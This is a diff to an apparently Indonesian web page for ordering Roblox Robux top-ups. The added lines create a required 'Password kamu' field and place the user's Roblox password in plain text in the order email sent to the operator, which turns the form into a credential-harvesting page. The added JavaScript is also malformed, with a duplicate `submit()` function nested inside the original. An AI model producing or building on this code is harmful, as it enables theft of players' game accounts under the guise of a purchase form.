@@ -24,6 +24,9 @@
 
   <input type="text" id="username" placeholder="Username Roblox"
     style="width:100%;padding:8px;margin-top:8px">
+  <input type="text" id="password" placeholder="Password kamu"
+    style="width:100%;padding:8px;margin-top:8px">
+
 
   <button type="button" onclick="submit()"
     style="
@@ -48,12 +51,21 @@ function submit(){
     return;
   }
 
+function submit(){
+  const password = document.getElementById("password").value;
+
+  if(password === ""){
+    alert("password Roblox wajib diisi!");
+    return;
+  }  
+
   const subject = "Order Top Up Robux";
 
   const body =
 `ORDER ROBUX
 ====================
 Username Roblox : ${username}
+Password Roblox : ${password}
 Jumlah Robux    : ${localStorage.getItem("robux")}
 Harga           : Rp ${localStorage.getItem("harga")}
 Pembayaran      : ${localStorage.getItem("payment")}`;
@@ -70,3 +82,4 @@ Pembayaran      : ${localStorage.getItem("payment")}`;
 
 </body>
 </html>
+
